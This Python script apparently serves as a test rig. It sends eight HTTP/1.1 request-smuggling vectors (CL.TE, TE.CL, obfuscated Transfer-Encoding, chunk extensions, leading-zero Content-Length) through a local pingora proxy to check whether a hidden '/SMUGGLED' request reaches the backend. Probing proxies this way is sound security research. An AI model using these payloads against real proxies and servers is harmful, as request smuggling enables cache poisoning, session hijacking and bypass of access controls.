#!/usr/bin/env python3
"""Send HTTP/1 request-smuggling vectors through the pingora proxy (:8898).

Each vector embeds a hidden `GET /SMUGGLED` request. If pingora's framing
desyncs from the Go backend, the backend logs a request with path=/SMUGGLED.
Classic CL/TE desync is normally mitigated by pingora re-serializing to the
upstream, so this probes edge cases of that re-serialization.
"""
import socket
import time

PROXY = ("127.0.0.1", 8898)
SMUG = b"GET /SMUGGLED HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\n"


def send(raw: bytes, label: str):
    try:
        s = socket.create_connection(PROXY, timeout=4)
        s.sendall(raw)
        time.sleep(0.4)
        try:
            s.settimeout(1.0)
            _ = s.recv(8192)
        except Exception:
            pass
        s.close()
    except Exception as e:
        print(f"[{label}] send error: {e}")
    time.sleep(0.2)


def vectors():
    v = {}
    # 1. CL.TE: declare CL that hides a chunked body + smuggled request
    body = b"0\r\n\r\n" + SMUG
    v["cl_te"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n%b" % (len(body), body)
    )
    # 2. TE.CL
    v["te_cl"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n"
        b"Content-Length: 4\r\n\r\n"
        b"5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 3. obfuscated TE: space before colon
    v["te_space"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding : chunked\r\n"
        b"Content-Length: %d\r\n\r\n0\r\n\r\n%b" % (len(b"0\r\n\r\n")+len(SMUG), SMUG)
    )
    # 4. double TE
    v["te_double"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n"
        b"Transfer-Encoding: cow\r\n\r\n5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 5. TE with tab
    v["te_tab"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding:\tchunked\r\n\r\n"
        b"5c\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 6. chunk-ext junk
    v["chunk_ext"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"5c;ext=\"x\"\r\n" + SMUG + b"\r\n0\r\n\r\n"
    )
    # 7. CL with leading zeros
    v["cl_zeros"] = (
        b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 00\r\n\r\n" + SMUG
    )
    # 8. plain pipelined (legitimate) - control: backend SHOULD see /SMUGGLED
    #    only when framing lets it through as a separate request; this is the
    #    baseline to confirm the rig can observe a second request at all.
    v["pipelined_control"] = (
        b"GET /first HTTP/1.1\r\nHost: x\r\n\r\n" + SMUG
    )
    return v


def main():
    vs = vectors()
    for label, raw in vs.items():
        print(f"[send] {label} ({len(raw)} bytes)")
        send(raw, label)
    print("[done] all vectors sent")


if __name__ == "__main__":
    main()
